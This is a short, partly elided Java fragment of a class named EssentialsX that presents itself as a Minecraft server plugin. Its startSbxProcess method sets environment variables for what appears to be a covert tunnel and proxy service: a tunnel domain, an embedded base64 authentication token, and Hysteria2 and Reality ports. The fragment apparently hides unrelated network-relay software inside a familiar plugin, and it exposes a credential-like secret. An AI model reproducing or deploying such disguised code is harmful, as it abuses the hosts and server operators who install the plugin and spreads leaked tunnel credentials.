...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("ARGO_DOMAIN", "opq.admire.cc.cd");
        env.put("ARGO_AUTH", "eyJhIjoiMDI5YmU0Y2RiZTc5MGE1ZDQ4NTg1OTUzYzMwNjljZTMiLCJ0IjoiM2Q3ZGIxYTUtZjFjMi00YTM1LThhYTEtOTcwOTc4YzE2M2IyIiwicyI6Ik5UZGtOek5oTjJJdFlUZzFOaTAwTTJVMkxUZzVNemN0TWpkalpXTmlabVk1WkdZNSJ9");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "4592");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "4592");
